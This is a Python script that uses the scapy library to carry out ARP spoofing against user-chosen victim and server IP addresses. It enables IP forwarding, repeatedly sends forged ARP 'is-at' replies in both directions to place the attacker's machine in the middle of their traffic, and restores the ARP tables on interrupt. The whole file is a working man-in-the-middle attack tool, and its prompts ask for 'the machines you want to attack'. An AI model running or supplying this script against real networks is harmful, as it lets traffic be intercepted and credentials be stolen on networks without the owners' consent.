from scapy.all import *
import argparse
import time
import os

####
# @method to start ipRouting
# @reason when the method is called, it checks whether ip routing is enabled or not
###
def enableAndStartIpRouting():
    path = "/proc/sys/net/ipv4/ip_forward"

    ipForwardFile = open(path)
    if ipForwardFile.read() == 1:
        return    

    ipForwardFileWrite = open(path, "w")
    print(1, file=ipForwardFileWrite)

def enableIpRoute():
    print("IP Routing is being enabled...")
    enableAndStartIpRouting()
    print("IP Routing is now enabled.")

def retrieveMacAddress(ipConfig):
    answeredPackets, unansweredPackets = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ipConfig), timeout=3, verbose=0)

    if answeredPackets:
        return answeredPackets[0][1].src

def arpSpoof(victimIp, serverIp):
    victimMac = retrieveMacAddress(victimIp)
    arpPackage = ARP(pdst=victimIp, hwdst=victimMac, psrc=serverIp, op="is-at")
    
    send(arpPackage, verbose=0)
    attackerMacAddress = ARP().hwsrc
    print("Packages have been sent to " + str(victimIp) + ", which means that, " + str(serverIp) + " is now at " + str(attackerMacAddress))

def resetToDefaults(victimIp, serverIp):
    victimMac = retrieveMacAddress(victimIp)
    serverMac = retrieveMacAddress(serverIp)

    arpPackage = ARP(pdst=victimIp, hwdst=victimMac, psrc=serverIp, hwsrc=serverMac, op="is-at")
    send(arpPackage, verbose=0, count=7)
    print("Packages have been sent to " + str(victimIp) + ", which means that, " + str(serverIp) + " is now at " + str(serverMac))

if __name__ == "__main__":
    victimIps = input("Enter the ips of the machines you want to attack, separated by commas: ")
    allVictims = victimIps.split(", ")
    serverIps = input("Enter the ips of the machines you want to act as a server: ")
    allServers = serverIps.split(", ")

    enableAndStartIpRouting()
    
    try:
        while True:
            for victim, server in zip(allVictims, allServers):
                arpSpoof(victim, server)
                arpSpoof(server, victim)
            time.sleep(1)
    except KeyboardInterrupt:
        for victim, server in zip(allVictims, allServers):
            resetToDefaults(victim, server)
            resetToDefaults(server, victim)
